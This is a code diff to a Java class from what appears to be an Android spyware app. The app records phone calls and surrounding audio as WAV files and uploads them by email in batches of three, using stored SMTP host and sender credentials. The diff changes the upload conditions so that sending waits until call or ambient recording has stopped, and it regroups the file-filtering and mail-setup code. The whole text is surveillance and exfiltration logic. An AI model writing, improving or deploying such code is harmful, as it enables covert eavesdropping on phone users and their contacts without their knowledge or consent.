@@ -183,24 +183,21 @@ public class GetInfoTask extends TimerTask
 		// Get all wav files
 		List<File> wavs = FileCtrl.getAllWavFiles(context);
 		if (wavs.size() > 0) {
-			wavs = FileCtrl.sortFileByTimeOrder(wavs);
-			List<File> callRecordWavs = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.callRecordFilePrefix);
-			int callRecordWavsCount = callRecordWavs.size();
-			List<File> envRecordWavs  = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.envRecordFilePrefix);
-			int envRecordWavsCount = envRecordWavs.size();
-			
 			// -------------------------------------------------------------------------------------------
 			// Firstly we should make sure: 
-			// 1. The phone is NOT off-hook
-			// 2. The networks are availble and meet the setting requirement
-			boolean allowToSend = false;
-			TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
-			try {
-				allowToSend = ! PhoneUtils.getITelephony(tm).isOffhook();
-			} catch (Exception e) {	
-				allowToSend = true;
+			// 1. The phone is NOT recording phone calls
+			// 2. The phone is NOT recording environment
+			// 3. The networks are availble and meet the setting requirement
+			
+			// Condition 1: The phone is NOT recording phone calls
+			boolean allowToSend = !GlobalValues.IS_CALL_RECORDING;
+			
+			// Condition 2: The phone is NOT recording environment
+			if (allowToSend) {
+				if (GlobalValues.IS_ENV_RECORDING) allowToSend = false;
 			}
 			
+			// Condition 3: The networks are availble and meet the setting requirement
 			if (allowToSend) {
 				if (!NetworkUtil.isNetworkConnected(context)) {
 					// Do not allow to send if data network is not connected
@@ -237,15 +234,22 @@ public class GetInfoTask extends TimerTask
 			// ------------------------------------------------------------------------------
 			// Start to send wav files
 			if (allowToSend) {
-				// --------------------------------------------------------------------------
-				// Send call record mails (3 wavs attached per mail) 
+				wavs = FileCtrl.sortFileByTimeOrder(wavs);
+				List<File> callRecordWavs = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.callRecordFilePrefix);
+				int callRecordWavsCount = callRecordWavs.size();
+				List<File> envRecordWavs  = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.envRecordFilePrefix);
+				int envRecordWavsCount = envRecordWavs.size();
+				
 				int COUNT_PER_PACKAGE = 3;
 				String phoneName = ConfigCtrl.getSelfName(context);
+				String fromStr   = context.getResources().getString(R.string.mail_from);
+				String host      = MailCfg.getHost(context);
+				String sender    = MailCfg.getSender(context);
+				String pwd       = MailCfg.getSenderPwd(context);
+				
+				// --------------------------------------------------------------------------
+				// Send call record mails (3 wavs attached per mail) 
 				String body = String.format(context.getResources().getString(R.string.mail_body_call_record), phoneName);
-				String fromStr = context.getResources().getString(R.string.mail_from);
-				String host = MailCfg.getHost(context);
-				String sender = MailCfg.getSender(context);
-				String pwd = MailCfg.getSenderPwd(context);
 		
 				for (int i = 0; i < (1 + callRecordWavsCount/COUNT_PER_PACKAGE); i++) {
 					List<File> pack = getPackage(callRecordWavs, COUNT_PER_PACKAGE, i);
